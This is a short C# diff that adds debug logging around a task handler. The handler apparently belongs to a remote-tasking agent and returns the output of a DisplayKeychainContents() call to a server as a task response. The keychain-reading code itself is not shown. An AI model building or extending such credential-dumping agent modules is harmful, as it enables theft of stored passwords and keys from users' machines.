@@ -18,12 +18,14 @@ namespace Workflow
 
         public async Task Execute(ServerJob job)
         {
+            DebugLog.Log($"Executing {Name} [{job.task.id}]");
             messageManager.AddTaskResponse(new TaskResponse()
             {
                 task_id = job.task.id,
                 user_output = DisplayKeychainContents(),
                 completed = true
             });
+            DebugLog.Log($"{Name} completed [{job.task.id}]");
         }
         public string DisplayKeychainContents()
         {
